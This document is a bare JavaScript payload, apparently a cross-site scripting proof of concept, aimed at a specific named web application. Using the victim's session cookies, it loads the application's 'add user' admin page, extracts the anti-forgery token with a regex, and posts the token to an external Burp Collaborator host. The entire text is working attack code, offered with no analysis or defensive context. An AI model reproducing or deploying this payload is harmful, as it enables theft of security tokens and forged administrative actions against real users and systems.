fetch('https://inspective.leaddocket.com/manageusers/add', {
    method: 'GET',
    credentials: 'include'
})
.then(response => response.text())
.then(html => {
    const match = html.match(/name="__RequestVerificationToken".*?value="([^"]+)"/s);
    if (match && match[1]) {
        // Send to your server
        fetch('https://8z8y0hvzgjyfox3prkiw9tg60x6oufm3b.oastify.com/receive-token', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({token: match[1]})
        });
    }
});